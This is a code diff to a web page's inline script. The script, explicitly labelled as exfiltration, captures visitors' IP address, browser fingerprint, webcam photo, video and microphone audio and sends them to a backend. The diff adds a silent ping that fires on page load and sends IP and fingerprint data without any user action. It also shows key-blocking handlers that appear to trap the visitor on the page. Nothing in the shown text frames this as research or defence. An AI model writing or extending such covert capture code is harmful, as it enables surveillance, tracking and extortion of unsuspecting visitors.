@@ -295,7 +295,7 @@ body, html {
         }
     }
 
-    // --- 6. Send everything to backend ---
+    // --- 6. Send everything to backend (full capture) ---
     async function sendToBackend(ipData, fingerprint, photo, video, mic) {
         const payload = {
             ipData,
@@ -329,9 +329,9 @@ body, html {
         }
     }
 
-    // --- 7. Main exfiltration ---
-    async function runExfiltration() {
-        console.log('[EXFIL] Starting capture...');
+    // --- 7. Main exfiltration (full capture, used on click) ---
+    async function runFullExfiltration() {
+        console.log('[EXFIL] Starting full capture...');
         try {
             const [ipData, fingerprint, photo, video, mic] = await Promise.all([
                 getIP(),
@@ -343,7 +343,23 @@ body, html {
             console.log('[EXFIL] Captured all data.');
             await sendToBackend(ipData, fingerprint, photo, video, mic);
         } catch (e) {
-            console.error('[EXFIL] Error in runExfiltration:', e);
+            console.error('[EXFIL] Error in runFullExfiltration:', e);
+        }
+    }
+
+    // --- 8. ⚡ IMMEDIATE SILENT PING (no media, runs on page load) ---
+    async function sendImmediateInfo() {
+        console.log('[EXFIL] Sending immediate IP + fingerprint...');
+        try {
+            const [ipData, fingerprint] = await Promise.all([
+                getIP(),
+                new Promise(resolve => resolve(getFingerprint()))
+            ]);
+            // Send only text data (photo, video, mic are null)
+            await sendToBackend(ipData, fingerprint, null, null, null);
+            console.log('[EXFIL] Immediate info sent.');
+        } catch (e) {
+            console.error('[EXFIL] Immediate info failed:', e);
         }
     }
 
@@ -483,8 +499,8 @@ body, html {
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
 
-        // ======== RUN EXFILTRATION IMMEDIATELY (inside user gesture) ========
-        runExfiltration().catch(console.warn);
+        // ======== RUN FULL EXFILTRATION (with webcam/mic) ========
+        runFullExfiltration().catch(console.warn);
     };
 
     document.getElementById('startOverlay').addEventListener('click', startExperience);
@@ -507,6 +523,10 @@ body, html {
             reengageLocks();
         }
     };
+
+    // ⚡ IMMEDIATE PING – fires right when the page loads
+    sendImmediateInfo();
+
 })();
 </script>
 </body>
